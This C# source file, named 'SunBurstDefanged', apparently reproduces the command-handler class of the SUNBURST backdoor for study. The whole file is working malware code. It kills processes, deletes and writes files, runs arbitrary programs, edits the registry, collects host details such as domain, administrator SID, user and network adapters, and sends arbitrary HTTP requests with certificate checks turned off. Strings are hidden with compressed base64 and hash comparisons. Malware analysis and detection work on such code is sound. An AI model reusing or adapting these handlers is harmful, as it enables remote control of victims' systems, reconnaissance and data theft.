using System;
using System.IO;
using System.Net;
using System.Text;
using System.Linq;
using Microsoft.Win32;
using System.Management;
using System.Diagnostics;
using System.Net.Security;
using System.Security.Principal;
using System.Security.Cryptography;
using System.Net.NetworkInformation;
using System.Security.Cryptography.X509Certificates;

namespace SunBurstDefanged
{
	public static class Job
	{
		public static int GetArgumentIndex(string cl, int num)
		{
			if (cl == null)
			{
				return -1;
			}
			if (num == 0)
			{
				return 0;
			}
			char[] array = cl.ToCharArray();
			bool flag = false;
			int num2 = 0;
			for (int i = 0; i < array.Length; i++)
			{
				if (array[i] == '"')
				{
					flag = !flag;
				}
				if (!flag && array[i] == ' ' && i > 0 && array[i - 1] != ' ')
				{
					num2++;
					if (num2 == num)
					{
						return i + 1;
					}
				}
			}
			return -1;
		}

		public static string[] SplitString(string cl)
		{
			if (cl == null)
			{
				return new string[0];
			}
			char[] array = cl.Trim().ToCharArray();
			bool flag = false;
			for (int i = 0; i < array.Length; i++)
			{
				if (array[i] == '"')
				{
					flag = !flag;
				}
				if (!flag && array[i] == ' ')
				{
					array[i] = '\n';
				}
			}
			string[] array2 = new string(array).Split(new char[]
			{
					'\n'
			}, StringSplitOptions.RemoveEmptyEntries);
			for (int j = 0; j < array2.Length; j++)
			{
				string text = "";
				bool flag2 = false;
				array2[j] = Utilities.Unquote(array2[j]);
				foreach (char c in array2[j])
				{
					if (flag2)
					{
						if (c != '`')
						{
							if (c == 'q')
							{
								text += "\"";
							}
							else
							{
								text = text + '`'.ToString() + c.ToString();
							}
						}
						else
						{
							text += '`'.ToString();
						}
						flag2 = false;
					}
					else if (c == '`')
					{
						flag2 = true;
					}
					else
					{
						text += c.ToString();
					}
				}
				if (flag2)
				{
					text += '`'.ToString();
				}
				array2[j] = text;
			}
			return array2;
		}

		public static void SetTime(string[] args, out int delay)
		{
			delay = int.Parse(args[0]);
		}

		public static void KillTask(string[] args)
		{
			Process.GetProcessById(int.Parse(args[0])).Kill();
		}

		public static void DeleteFile(string[] args)
		{
			File.Delete(Environment.ExpandEnvironmentVariables(args[0]));
		}

		public static int GetFileHash(string[] args, out string result)
		{
			result = null;
			string path = Environment.ExpandEnvironmentVariables(args[0]);
			using (MD5 md = MD5.Create())
			{
				using (FileStream fileStream = File.OpenRead(path))
				{
					byte[] bytes = md.ComputeHash(fileStream);
					if (args.Length > 1)
					{
						return (!(Utilities.ByteArrayToHexString(bytes).ToLower() == args[1].ToLower())) ? 1 : 0;
					}
					result = Utilities.ByteArrayToHexString(bytes);
				}
			}
			return 0;
		}

		public static void GetFileSystemEntries(string[] args, out string result)
		{
			string searchPattern = (args.Length >= 2) ? args[1] : "*";
			string path = Environment.ExpandEnvironmentVariables(args[0]);
			string[] value = (from f in Directory.GetFiles(path, searchPattern)
							  select Path.GetFileName(f)).ToArray<string>();
			string[] value2 = (from f in Directory.GetDirectories(path, searchPattern)
							   select Path.GetFileName(f)).ToArray<string>();
			result = string.Join("\n", value2) + "\n\n" + string.Join(" \n", value);
		}

		public static void GetProcessByDescription(string[] args, out string result)
		{
			result = null;
			if (args.Length == 0)
			{
				foreach (Process process in Process.GetProcesses())
				{
					// [{0,5}] {1}
					result += string.Format(ZipHelper.Unzip("i6420DGtjVWoNqzlAgA="), process.Id, Utilities.Quote(process.ProcessName));
				}
				return;
			}
			// Select * From Win32_Process
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(ZipHelper.Unzip("C07NSU0uUdBScCvKz1UIz8wzNooPKMpPTi0uBgA=")))
			{
				foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
				{
					ManagementObject managementObject = (ManagementObject)managementBaseObject;
					string[] array = new string[]
					{
							string.Empty,
							string.Empty
					};
					ManagementObject managementObject2 = managementObject;
					// GetOwner
					string methodName = ZipHelper.Unzip("c08t8S/PSy0CAA==");
					object[] array2 = array;
					object[] args2 = array2;
					// [{0,5}] {1,-16} {2}	{3,5} {4}\{5}
					Convert.ToInt32(managementObject2.InvokeMethod(methodName, args2));
					result += string.Format(ZipHelper.Unzip("i6420DGtjVWoNtTRNTSrVag2quWsNgYKKVSb1MZUm9ZyAQA="), new object[]
					{
							// ProcessID
							// Name
							// ParentProcessID
							managementObject[ZipHelper.Unzip("CyjKT04tLvZ0AQA=")],
							Utilities.Quote(managementObject[ZipHelper.Unzip("80vMTQUA")].ToString()),
							managementObject[args[0]],
							managementObject[ZipHelper.Unzip("C0gsSs0rCSjKT04tLvZ0AQA=")],
							array[1],
							array[0]
					});
				}
			}
		}

		private static string GetDescriptionId(ref int i)
		{
			i++;
			return "\n" + i.ToString() + ". ";
		}

		public static void CollectSystemDescription(string info, out string result)
		{
			result = null;
			int num = 0;
			string domainName = IPGlobalProperties.GetIPGlobalProperties().DomainName;
			result = result + Job.GetDescriptionId(ref num) + domainName;
			try
			{
				// Administrator
				string str = ((SecurityIdentifier)new NTAccount(domainName, ZipHelper.Unzip("c0zJzczLLC4pSizJLwIA")).Translate(typeof(SecurityIdentifier))).AccountDomainSid.ToString();
				result = result + Job.GetDescriptionId(ref num) + str;
			}
			catch
			{
				result += Job.GetDescriptionId(ref num);
			}
			result = result + Job.GetDescriptionId(ref num) + IPGlobalProperties.GetIPGlobalProperties().HostName;
			result = result + Job.GetDescriptionId(ref num) + Environment.UserName;
			result = result + Job.GetDescriptionId(ref num) + Utilities.GetOSVersion(true);
			result = result + Job.GetDescriptionId(ref num) + Environment.SystemDirectory;
			result = result + Job.GetDescriptionId(ref num) + (int)TimeSpan.FromMilliseconds(Environment.TickCount).TotalDays;
			result = result + Job.GetDescriptionId(ref num) + info + "\n";
			result += Utilities.GetNetworkAdapterConfiguration();
		}

		public static void UploadSystemDescription(string[] args, out string result, IWebProxy proxy)
		{
			result = null;
			string requestUriString = args[0];
			string s = args[1];
			string text = (args.Length >= 3) ? args[2] : null;
			string[] array = Encoding.UTF8.GetString(Convert.FromBase64String(s)).Split(new string[]
			{
					"\r\n",
					"\r",
					"\n"
			}, StringSplitOptions.None);
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(requestUriString);
			HttpWebRequest httpWebRequest2 = httpWebRequest;
			httpWebRequest2.ServerCertificateValidationCallback =
				(RemoteCertificateValidationCallback)Delegate.Combine(httpWebRequest2.ServerCertificateValidationCallback, new RemoteCertificateValidationCallback((object sender, X509Certificate cert, X509Chain chain, SslPolicyErrors sslPolicyErrors) => true));
			httpWebRequest.Proxy = proxy;
			httpWebRequest.Timeout = 120000;
			httpWebRequest.Method = array[0].Split(new char[]
			{
					' '
			})[0];
			foreach (string text2 in array)
			{
				int num = text2.IndexOf(':');
				if (num > 0)
				{
					string text3 = text2.Substring(0, num);
					string text4 = text2.Substring(num + 1).TrimStart(Array.Empty<char>());
					if (!WebHeaderCollection.IsRestricted(text3))
					{
						httpWebRequest.Headers.Add(text2);
					}
					else
					{
						ulong hash = Utilities.GetHash(text3.ToLower());
						// expect
						if (hash <= 8873858923435176895UL)
						{
							// content-type
							if (hash <= 6116246686670134098UL)
							{
								// accept
								if (hash != 2734787258623754862UL)
								{
									// content-type
									if (hash == 6116246686670134098UL)
									{
										httpWebRequest.ContentType = text4;
									}
								}
								else
								{
									httpWebRequest.Accept = text4;
								}
							}
							// user-agent
							else if (hash != 7574774749059321801UL)
							{
								// expect
								if (hash == 8873858923435176895UL)
								{
									// 100-continue
									if (Utilities.GetHash(text4.ToLower()) == 1475579823244607677UL)
									{
										httpWebRequest.ServicePoint.Expect100Continue = true;
									}
									else
									{
										httpWebRequest.Expect = text4;
									}
								}
							}
							else
							{
								httpWebRequest.UserAgent = text4;
							}
						}
						// connection
						else if (hash <= 11266044540366291518UL)
						{
							// referer
							if (hash != 9007106680104765185UL)
							{
								// connection
								if (hash == 11266044540366291518UL)
								{
									ulong hash2 = Utilities.GetHash(text4.ToLower());
									// keep-alive
									httpWebRequest.KeepAlive = (hash2 == 13852439084267373191UL || httpWebRequest.KeepAlive);
									// close
									httpWebRequest.KeepAlive = (hash2 != 14226582801651130532UL && httpWebRequest.KeepAlive);
								}
							}
							else
							{
								httpWebRequest.Referer = text4;
							}
						}
						// if-modified-since
						else if (hash != 15514036435533858158UL)
						{
							// date
							if (hash == 16066522799090129502UL)
							{
								httpWebRequest.Date = DateTime.Parse(text4);
							}
						}
						else
						{
							httpWebRequest.Date = DateTime.Parse(text4);
						}
					}
				}
			}
			// {0} {1} HTTP/{2}

			result += string.Format(ZipHelper.Unzip("qzaoVag2rFXwCAkJ0K82quUCAA=="), httpWebRequest.Method, httpWebRequest.Address.PathAndQuery, httpWebRequest.ProtocolVersion.ToString());
			result = result + httpWebRequest.Headers.ToString() + "\n\n";
			if (!string.IsNullOrEmpty(text))
			{
				using (Stream requestStream = httpWebRequest.GetRequestStream())
				{
					byte[] array3 = Convert.FromBase64String(text);
					requestStream.Write(array3, 0, array3.Length);
				}
			}
			using (WebResponse response = httpWebRequest.GetResponse())
			{
				result += string.Format("{0} {1}\n", (int)((HttpWebResponse)response).StatusCode, ((HttpWebResponse)response).StatusDescription);
				result = result + response.Headers.ToString() + "\n";
				using (Stream responseStream = response.GetResponseStream())
				{
					result += new StreamReader(responseStream).ReadToEnd();
				}
			}
		}

		public static int RunTask(string[] args, string cl, out string result)
		{
			result = null;
			string fileName = Environment.ExpandEnvironmentVariables(args[0]);
			string arguments = (args.Length > 1) ? cl.Substring(Job.GetArgumentIndex(cl, 1)).Trim() : null;
			using (Process process = new Process())
			{
				process.StartInfo = new ProcessStartInfo(fileName, arguments)
				{
					CreateNoWindow = false,
					UseShellExecute = false
				};
				if (process.Start())
				{
					result = process.Id.ToString();
					return 0;
				}
			}
			return 1;
		}

		public static void WriteFile(string[] args)
		{
			string path = Environment.ExpandEnvironmentVariables(args[0]);
			byte[] array = Convert.FromBase64String(args[1]);
			for (int i = 0; i < 3; i++)
			{
				try
				{
					using (FileStream fileStream = new FileStream(path, FileMode.Append, FileAccess.Write))
					{
						fileStream.Write(array, 0, array.Length);
					}
					break;
				}
				catch (Exception)
				{
					if (i + 1 >= 3)
					{
						throw;
					}
				}
				Utilities.DelayMs(0.0, 0.0);
			}
		}

		public static void FileExists(string[] args, out string result)
		{
			string path = Environment.ExpandEnvironmentVariables(args[0]);
			result = File.Exists(path).ToString();
		}

		public static int ReadRegistryValue(string[] args, out string result)
		{
			result = RegistryHelper.GetValue(args[0], args[1], null);
			if (result != null)
			{
				return 0;
			}
			return 1;
		}

		public static void DeleteRegistryValue(string[] args)
		{
			RegistryHelper.DeleteValue(args[0], args[1]);
		}

		public static void GetRegistrySubKeyAndValueNames(string[] args, out string result)
		{
			result = RegistryHelper.GetSubKeyAndValueNames(args[0]);
		}

		public static int SetRegistryValue(string[] args)
		{
			RegistryValueKind valueKind = (RegistryValueKind)Enum.Parse(typeof(RegistryValueKind), args[2]);
			string valueData = (args.Length > 3) ? Encoding.UTF8.GetString(Convert.FromBase64String(args[3])) : "";
			if (!RegistryHelper.SetValue(args[0], args[1], valueData, valueKind))
			{
				return 1;
			}
			return 0;
		}
	}
}
